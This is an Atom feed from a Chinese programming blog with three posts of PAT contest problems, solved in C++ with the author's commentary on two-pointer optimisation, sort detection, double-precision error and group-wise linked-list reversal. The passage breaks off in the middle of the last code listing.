<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa1r0t</title>
  
  <subtitle>记录成长</subtitle>
  <link href="https://pa1r0t.github.io/atom.xml" rel="self"/>
  
  <link href="https://pa1r0t.github.io/"/>
  <updated>2023-05-11T07:47:08.762Z</updated>
  <id>https://pa1r0t.github.io/</id>
  
  <author>
    <name>Pa1r0t_9e</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>双指针优化</title>
    <link href="https://pa1r0t.github.io/2023/05/11/%E5%8F%8C%E6%8C%87%E9%92%88%E4%BC%98%E5%8C%96/"/>
    <id>https://pa1r0t.github.io/2023/05/11/%E5%8F%8C%E6%8C%87%E9%92%88%E4%BC%98%E5%8C%96/</id>
    <published>2023-05-11T07:21:59.000Z</published>
    <updated>2023-05-11T07:47:08.762Z</updated>
    
    <content type="html"><![CDATA[<p><strong>完美数列</strong></p><span id="more"></span><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>给定一个正整数数列，和正整数 <em>p</em>，设这个数列中的最大值是 <em>M</em>，最小值是 <em>m</em>，如果 <em>M</em>≤<em>m**p</em>，则称这个数列是完美数列。</p><p>现在给定参数 <em>p</em> 和一些正整数，请你从中选择尽可能多的数构成一个完美数列。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>输入第一行给出两个正整数 <em>N</em> 和 <em>p</em>，其中 <em>N</em>（≤105）是输入的正整数的个数，<em>p</em>（≤109）是给定的参数。第二行给出 <em>N</em> 个正整数，每个数不超过 109。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>在一行中输出最多可以选择多少个数可以用它们组成一个完美数列。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10 8</span><br><span class="line">2 3 20 4 5 1 6 7 8 9</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8</span><br></pre></td></tr></table></figure><blockquote><p>题目分析：原先我的想法是假设最长数列就是n，然后有序数组进行两端判断。想法是有，但是代码不知道怎么写</p><p>柳神是用双指针，这题其实双指针的时间复杂度都能上n^2^了，所以这里双指针要优化一下，用res来存放当前最长长度，</p><p>第一重循环用i&#x3D;0~n,第二层循环j就不能从0开始了否则太慢了，而且重复了。</p><p>第二重循环用j&#x3D;i+res~n</p><p>第二重循环中判断到不符合条件就直接跳出了，因为这是个有序数组，之后的数据也都不成立了。</p><p>所以做这两个优化后，效率杠杠的👍</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">long</span> p;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; p;</span><br><span class="line"><span class="type">int</span> a[n],i,j;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n ;i++) cin &gt;&gt; a[i];</span><br><span class="line"><span class="built_in">sort</span>(a,a+n);</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">0</span>,res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n ;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=i + res;j &lt; n;j++)  </span><br><span class="line"><span class="keyword">if</span>(a[i] * p &gt;= a[j] &amp;&amp; (tmp = j - i + <span class="number">1</span>) &gt; res)  res = tmp;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; res;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="归并与插入"><a href="#归并与插入" class="headerlink" title="归并与插入"></a>归并与插入</h2><p><strong>插入排序</strong>是迭代算法，逐一获得输入数据，逐步产生有序的输出序列。每步迭代中，算法从输入序列中取出一元素，将之插入有序序列中正确的位置。如此迭代直到全部元素有序。</p><p><strong>归并排序</strong>进行如下迭代操作：首先将原始序列看成 N 个只包含 1 个元素的有序子序列，然后每次迭代归并两个相邻的有序子序列，直到最后只剩下 1 个有序的序列。</p><p>现给定原始序列和由某排序算法产生的中间序列，请你判断该算法究竟是哪种排序算法？</p><h3 id="输入格式：-1"><a href="#输入格式：-1" class="headerlink" title="输入格式："></a>输入格式：</h3><p>输入在第一行给出正整数 N (≤100)；随后一行给出原始序列的 N 个整数；最后一行给出由某排序算法产生的中间序列。这里假设排序的目标序列是升序。数字间以空格分隔。</p><h3 id="输出格式：-1"><a href="#输出格式：-1" class="headerlink" title="输出格式："></a>输出格式：</h3><p>首先在第 1 行中输出<code>Insertion Sort</code>表示插入排序、或<code>Merge Sort</code>表示归并排序；然后在第 2 行中输出用该排序算法再迭代一轮的结果序列。题目保证每组测试的结果是唯一的。数字间以空格分隔，且行首尾不得有多余空格。</p><h3 id="输入样例-1："><a href="#输入样例-1：" class="headerlink" title="输入样例 1："></a>输入样例 1：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">3 1 2 8 7 5 9 4 6 0</span><br><span class="line">1 2 3 7 8 5 9 4 6 0</span><br></pre></td></tr></table></figure><h3 id="输出样例-1："><a href="#输出样例-1：" class="headerlink" title="输出样例 1："></a>输出样例 1：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Insertion Sort</span><br><span class="line">1 2 3 5 7 8 9 4 6 0</span><br></pre></td></tr></table></figure><h3 id="输入样例-2："><a href="#输入样例-2：" class="headerlink" title="输入样例 2："></a>输入样例 2：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">3 1 2 8 7 5 9 4 0 6</span><br><span class="line">1 3 2 8 5 7 4 9 0 6</span><br></pre></td></tr></table></figure><h3 id="输出样例-2："><a href="#输出样例-2：" class="headerlink" title="输出样例 2："></a>输出样例 2：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Merge Sort</span><br><span class="line">1 2 3 8 4 5 7 9 0 6</span><br></pre></td></tr></table></figure><blockquote><p>题目分析：</p><p>这题由于插入排序是从后往前的，所以插入排序的中间序列一定是，前段有序，后段和原序列相同。</p><p>归并排序的话没有直观的规律，这里不是插入就是归并了，极端情况的数据没有意义</p><p>这里归并排序的下一个序列，由于无法判断是第几次归并，所以只能用原序列进行一次次归并比较中间序列，直到全部吻合</p><p><code>这里值得学习的是，用c++的sort函数，直接忽略了插入排序和归并排序的具体排序细节，运行效率可能没有她两好，不过开发效率很香</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> a[n],b[n],i,j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i &lt; n;i++) cin &gt;&gt; a[i];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i &lt; n;i++) cin &gt;&gt; b[i];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;b[i] &lt;= b[i+<span class="number">1</span>];i++);</span><br><span class="line"><span class="keyword">for</span>(j=i + <span class="number">1</span>;b[j] == a[j] &amp;&amp; j &lt; n;j++);</span><br><span class="line"><span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Insertion Sort&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">sort</span>(a,a+i+<span class="number">2</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Merge Sort&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="type">int</span> flag = <span class="number">1</span> , k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(flag)&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n ; i++) <span class="keyword">if</span>(a[i] != b[i]) flag = <span class="number">1</span>;</span><br><span class="line">k *= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n / k ; i++) <span class="built_in">sort</span>(a + i * k, a + (i+<span class="number">1</span>)*k );</span><br><span class="line"><span class="built_in">sort</span>(a + n / k * k, a + n); <span class="comment">// n / k 不整除的情况下，剩余部分给计算进去 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">0</span>) cout &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; a[i];</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;完美数列&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>关于c++中double误差问题</title>
    <link href="https://pa1r0t.github.io/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/"/>
    <id>https://pa1r0t.github.io/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/</id>
    <published>2023-05-10T02:46:59.000Z</published>
    <updated>2023-05-11T07:19:11.498Z</updated>
    
    <content type="html"><![CDATA[<p>question: double</p><span id="more"></span><h2 id="PAT甲级题"><a href="#PAT甲级题" class="headerlink" title="PAT甲级题"></a>PAT甲级题</h2><p>给定一个正数数列，我们可以从中截取任意的连续的几个数，称为片段。例如，给定数列 { 0.1, 0.2, 0.3, 0.4 }，我们有 (0.1) (0.1, 0.2) (0.1, 0.2, 0.3) (0.1, 0.2, 0.3, 0.4) (0.2) (0.2, 0.3) (0.2, 0.3, 0.4) (0.3) (0.3, 0.4) (0.4) 这 10 个片段。</p><p>给定正整数数列，求出全部片段包含的所有的数之和。如本例中 10 个片段总和是 0.1 + 0.3 + 0.6 + 1.0 + 0.2 + 0.5 + 0.9 + 0.3 + 0.7 + 0.4 &#x3D; 5.0。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>输入第一行给出一个不超过 105 的正整数 <em>N</em>，表示数列中数的个数，第二行给出 <em>N</em> 个不超过 1.0 的正数，是数列中的数，其间以一个空格分隔。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>在一行中输出该序列所有片段包含的数之和，</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">0.1 0.2 0.3 0.4</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.00</span><br></pre></td></tr></table></figure><p>关于这题的分析：</p><blockquote><p>我是看了柳神的，我天真地以为一个数据出现了n-1词，但比如0.2在0.1的条件下，就已经出现了3次了</p></blockquote><p>柳神原话：将数列中的每个数字读取到temp中，假设我们选取的片段中包括temp，且这个片段的首尾指针分别为p和q，那么对于p，有i种选择，即12…i，对于q，有n-i+1种选择，即i, i+1, … n，所以p和q组合形成的首尾片段有i * (n-i+1)种，因为每个里面都会出现temp，所以temp引起的总和为temp * i * (n – i + 1)；遍历完所有数字，将每个temp引起的总和都累加到sum中，最后输出sum的值</p><p>原先的代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">double</span> tmp,sum = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">sum += tmp * (i + <span class="number">1</span>) * (n - i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>,sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结果不太行啊</strong></p><p><img data-src="/./../images/image-20230510111635757.png" alt="image-20230510111635757"></p><blockquote><p>这里用double进行运算时是会产生误差的，因为有些数用二进制表示不出来，c++中只能粗略表示.</p><p>具体参考文章：<a href="https://bipy.me/post/about-double/">由一道 OJ 引发的关于 double 类型的一些思考 | Lust for Life (bipy.me)</a></p></blockquote><p>然后大佬给出的方案是用long long 类型进行小数点后移×1000，这里其实就要考虑所给的数据是否都是最多小数点后三位了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">double</span> tmp;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">sum += (<span class="type">long</span> <span class="type">long</span>)(tmp * <span class="number">1000</span>) * (i + <span class="number">1</span>) * (n - i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>,sum/<span class="number">1000.0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然后这里居然才4.99</strong></p><p><img data-src="/./../images/image-20230510135403050.png" alt="image-20230510135403050"></p><p>更离谱的是给通过了😂笑死，反正我感觉很不靠谱</p><p><img data-src="/./../images/image-20230510135517225.png" alt="image-20230510135517225"></p><p><strong>其实我觉得这题用java中的bigdecimal才是最优</strong></p><p>动态规划类解法：(从后往前遍历)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">double</span> tmp;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> seq[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">seq[i] = (<span class="type">long</span> <span class="type">long</span>)(tmp * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">sum = seq[n<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=n - <span class="number">2</span>;i !=<span class="number">-1</span> ;i--)&#123;</span><br><span class="line">seq[i] = seq[i] * (n - i ) + seq[i+<span class="number">1</span>];</span><br><span class="line">sum += seq[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>,sum/<span class="number">1000.0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;question: double&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>奇奇怪怪的错误</title>
    <link href="https://pa1r0t.github.io/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/"/>
    <id>https://pa1r0t.github.io/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/</id>
    <published>2023-05-09T02:30:44.000Z</published>
    <updated>2023-05-11T07:17:17.778Z</updated>
    
    <content type="html"><![CDATA[<p>PAT乙级第二天记录——反转链表（纯数组解）</p><span id="more"></span><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>给定一个常数 <em>K</em> 以及一个单链表 <em>L</em>，请编写程序将 <em>L</em> 中每 <em>K</em> 个结点反转。例如：给定 <em>L</em> 为 1→2→3→4→5→6，<em>K</em> 为 3，则输出应该为 3→2→1→6→5→4；如果 <em>K</em> 为 4，则输出应该为 4→3→2→1→5→6，即最后不到 <em>K</em> 个元素不反转。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个输入包含 1 个测试用例。每个测试用例第 1 行给出第 1 个结点的地址、结点总个数正整数 <em>N</em> (≤105)、以及正整数 <em>K</em> (≤<em>N</em>)，即要求反转的子链结点的个数。结点的地址是 5 位非负整数，NULL 地址用 −1 表示。</p><p>接下来有 <em>N</em> 行，每行格式为：</p><figure class="highlight purebasic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Address <span class="keyword">Data</span> <span class="keyword">Next</span></span><br></pre></td></tr></table></figure><p>其中 <code>Address</code> 是结点地址，<code>Data</code> 是该结点保存的整数数据，<code>Next</code> 是下一结点的地址。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>对每个测试用例，顺序输出反转后的链表，其上每个结点占一行，格式与输入相同。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00100 6 4</span><br><span class="line">00000 4 99999</span><br><span class="line">00100 1 12309</span><br><span class="line">68237 6 -1</span><br><span class="line">33218 3 00000</span><br><span class="line">99999 5 68237</span><br><span class="line">12309 2 33218</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000 4 33218</span><br><span class="line">33218 3 12309</span><br><span class="line">12309 2 00100</span><br><span class="line">00100 1 99999</span><br><span class="line">99999 5 68237</span><br><span class="line">68237 6 -1</span><br></pre></td></tr></table></figure><p>奇奇怪怪的错误</p><p><img data-src="/./../images/image-20230509104121801.png" alt="image-20230509104121801"></p><p>后面发现是我main函数return 1</p><p>搜了网友的回答：shell返回值非0是程序退出异常，说明你的代码抛出了异常。</p><p>soga！！！</p><blockquote><p>首先这题并没有用到链表结构而是用几个容量大的数组把数据存起来，存起来之后再用一个数组把节点地址线性存起来，节点下一个地址就是下一个位置的值，太妙了😁！！！反转的话直接在地址上反转就行丝毫不影响数据之间的变化。</p></blockquote><p>原本我的代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> first,N,K,tmp;</span><br><span class="line"><span class="type">int</span> next[<span class="number">100000</span>],data[<span class="number">100000</span>],list[<span class="number">100000</span>];</span><br><span class="line">cin &gt;&gt; first &gt;&gt; N &gt;&gt; K;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">cin &gt;&gt; data[tmp] &gt;&gt; next[tmp];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>; <span class="comment">// 不是所有节点都在链上 </span></span><br><span class="line"><span class="comment">//用list数组构造链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;first != <span class="number">-1</span>;i++)&#123;</span><br><span class="line">list[sum++] = first;</span><br><span class="line">first = next[first];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反转链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;sum-i*K;i+=K)&#123;</span><br><span class="line"><span class="built_in">reverse</span>(<span class="built_in">begin</span>(list)+i,<span class="built_in">begin</span>(list)+i+K);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;sum<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%05d %d %05d\n&quot;</span>,list[i],data[list[i]],list[i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%05d %d -1&quot;</span>,list[sum<span class="number">-1</span>],data[list[sum<span class="number">-1</span>]]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里的错误主要是<strong>【i&lt;sum-i*K】</strong>。</p><p>我真是脑残，i的值是会变的呀，只能说我写的时候思维好不严谨😢</p><p>修改后：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> first,N,K,tmp;</span><br><span class="line"><span class="type">int</span> next[<span class="number">100000</span>],data[<span class="number">100000</span>],list[<span class="number">100000</span>];</span><br><span class="line">cin &gt;&gt; first &gt;&gt; N &gt;&gt; K;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">cin &gt;&gt; data[tmp] &gt;&gt; next[tmp];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>; <span class="comment">// 不是所有节点都在链上 </span></span><br><span class="line"><span class="comment">//用list数组构造链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;first != <span class="number">-1</span>;i++)&#123;</span><br><span class="line">list[sum++] = first;</span><br><span class="line">first = next[first];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反转链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=sum - sum % K;i+=K)&#123;</span><br><span class="line"><span class="built_in">reverse</span>(<span class="built_in">begin</span>(list)+i,<span class="built_in">begin</span>(list)+i+K);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;sum<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span 